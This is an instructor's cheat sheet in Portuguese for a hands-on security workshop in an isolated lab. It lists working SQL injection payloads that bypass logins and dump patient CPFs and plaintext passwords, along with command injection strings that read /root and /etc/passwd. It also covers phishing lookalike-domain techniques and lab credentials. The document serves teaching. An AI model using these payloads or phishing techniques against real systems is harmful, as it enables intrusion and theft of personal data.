<!-- Documento original do workshop. As flags foram substituidas pelos
     marcadores __C1_FLAG__ / __C2_FLAG__ (preenchidos por infra/.env). -->

# Workshop — Payloads dos Cenários (folha de cola do instrutor)

> Material **de treinamento**, para uso **somente no ambiente isolado do workshop**.
> Os payloads abaixo são os que o roteiro de cada cenário usa. Pensado para montar
> slides de demonstração guiada.

---

## Cenário 1 — SQL Injection (MedClinic · Portal do Paciente)

**Onde digitar:** campo **"Buscar nos meus exames"** (e, no bônus, no campo usuário do login).
**Dica de sintaxe (MySQL):** usar `#` como comentário (não `-- `), porque formulários
HTML descartam o espaço que o `--` exige.

### 1. Quebrar o filtro de paciente (vazar todos os exames)
```
' OR 1=1 #
```
Efeito: a condição vira sempre verdadeira → retorna exames de **todos os ~1000 pacientes**.

### 2. Descobrir o nº de colunas (preparar o UNION)
```
' ORDER BY 5 #
' ORDER BY 6 #
```
`5` funciona, `6` dá erro → a consulta tem **5 colunas**.

### 3. Extrair a flag (UNION-based)
```
' AND 1=2 UNION SELECT flag, CURDATE(), 'secret', name, flag FROM secrets #
```
A flag aparece na coluna **Paciente** (e em Resultado). O `1=2` zera os exames reais,
deixando só a linha da flag.

### 4. Vazar dados pessoais / CPF (UNION na tabela `patients`)
```
' AND 1=2 UNION SELECT name, birthdate, cpf, email, phone FROM patients #
```
Versão completa (junta endereço + convênio no último campo):
```
' AND 1=2 UNION SELECT name, birthdate, cpf, email, CONCAT(phone,' · ',address,' · ',insurance,' ',insurance_id) FROM patients #
```

### 5. Roubar credenciais (UNION na tabela `users`)
```
' AND 1=2 UNION SELECT username, '', password, role, fullname FROM users #
```
Vaza senhas em **texto puro** (ex.: `user / user123`, `admin / S3nh4Admin!2024`).

### 6. (Bônus) Bypass de login
No campo **usuário** da tela de login, com qualquer senha:
```
admin'#
```
O `#` comenta a checagem de senha → entra como **admin**.

**Flag:** `__C1_FLAG__`

---

## Cenário 2 — Command Injection (Meridian Capital · Portal do Investidor)

**Onde digitar:** campo **"destino"** do card **"Backup da carteira"**.
**Separadores que mostram a saída:** `;`, `|`, `&&`, `||`.
(`$(...)` e crases também executam, mas a saída não aparece — use os separadores acima.)

### 1. Confirmar a injeção e o privilégio (rodando como root)
```
x; id
```
Saída inclui `uid=0(root) gid=0(root)`.

Variações equivalentes:
```
x | whoami
x && id
```

### 2. Capturar a flag (arquivo só-root)
```
x; cat /root/flag.txt
```

### 3. Demonstrar o poder do RCE (impacto)
```
x; ls -la /root
x; cat /etc/passwd
x; uname -a; hostname; ps aux
x; cat /usr/src/app/data/carteira.json
```

**Flag:** `__C2_FLAG__`

---

## Cenário 3 — Phishing (não há "payload" de injeção; há indicadores e técnicas)

O ataque é de **engenharia social** — o "payload" é o próprio e-mail. O que mostrar
na apresentação são as **técnicas** e os **sinais** que o participante deve reconhecer.

### Os 5 e-mails de phishing e a técnica de cada um
| E-mail (remetente) | Técnica real |
|---|---|
| Suporte TI — `@meridiancapital-ti.com` | **Domínio sósia** + **pressão** (senha expira 24h / bloqueio) |
| Cobrança — `@nf-eletronica-br.com` | **Medo/pressão** (protesto) + anexo `.zip` |
| Documento compartilhado — `@meridian-docs-share.com` *(isca)* | **Escassez/urgência** ("expira em 2h") → dispara a simulação |
| CFO Ricardo Menezes — `@meridiancap`**l**`tal.com.br` | **BEC / fraude do CEO**: autoridade + urgência + sigilo + **letra trocada** (l↔i) |
| Benefícios — `@meridian-beneficios.com` | **Recompensa** (PLR liberada) + prazo + coleta de dados bancários |

### Os 4 sinais para o gestor levar pra casa
1. **Domínio trocado/parecido** — letra a mais, letra trocada, ou domínio externo.
2. **Pressão** — ameaça, bloqueio, consequência negativa.
3. **Urgência/escassez** — prazo curto, "agora", "expira".
4. **Recompensa** — prêmio, dinheiro, benefício liberado.

### Gatilho da simulação (uso do instrutor, não é "ataque")
- A isca abre `http://<IP-GERENCIA>/documento` dentro da VM; a página aciona o
  serviço local de bloqueio da VM.
- Disparo/kill-switch da tela de bloqueio nas VMs (serviço local, porta 10000):
```
http://<IP-da-VM>:10000/hack     (liga a tela de bloqueio)
http://<IP-da-VM>:10000/voltar   (reverte)
http://<IP-da-VM>:10000/status   (consulta estado: infectada / normal)
```
- No painel `/admin` isso é feito pelos botões **Infectar todas (cascata 5s)** e
  **Reverter todas (imediato)**; o **auto-surto** espalha sozinho quando alguém cai.

---

## Resumo de credenciais (apoio à demo)

| Item | Valor |
|---|---|
| Login C1 (demo) | `user` / `user123` |
| Admin C1 (vazável via SQLi) | `admin` / `S3nh4Admin!2024` |
| Login C2 | `investidor` / `Invest@2024` |
| RDP nas VMs (Cenário 3) | `aluno` / `Workshop@2024` |
| Painel do instrutor | `admin` / `Cyber@2022` |
